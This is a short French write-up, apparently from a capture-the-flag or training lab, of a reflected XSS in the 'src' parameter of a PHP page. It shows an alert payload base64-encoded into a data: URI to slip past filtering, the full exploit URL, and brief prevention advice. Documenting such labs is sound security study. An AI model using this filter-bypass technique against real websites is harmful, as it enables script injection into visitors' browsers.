# Reflected XSS

## Vulnérabilité

Sur la page principale (`index.php`), il y a plusieurs images présentées, mais une seule inclut un lien dans l'image. En cherchant un peu on se rend compte que le paramètre `src` est utilisé sans trop de précaution.

On peut essayer de passer directement un payload `<script>alert("hello");</script>`, mais on se retouve avec une page cassée et une `wrong answer`.

On va donc ruser un peu et passer notre payload par le protocol `data` du navigateur, et encode en base64

Payload en base64
```shell
  echo '<script>alert("hello");</script>' | base64 -
  PHNjcmlwdD5hbGVydCgiaGVsbG8iKTs8L3NjcmlwdD4K
```

Url final:
```url
  http://[..]/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgiaGVsbG8iKTs8L3NjcmlwdD4K
```


## Prévention

Appliquer un assainissement (`sanitize`) des paramètres de `querystring`
Ne pas utiliser de manière brut et sans vérification des données pouvant être envoyé par un acteur malicieux
Faire attention à la manière dont les protocls dangeureux sont utilisés.


## Ressources

[reflected xss](https://stackoverflow.com/questions/29132797/is-it-possible-to-xss-a-query-string)
[xss geeksforgeeks](https://www.geeksforgeeks.org/ethical-hacking/reflected-xss-vulnerability-in-depth/)
[data uri scheme](https://en.wikipedia.org/wiki/Data_URI_scheme)
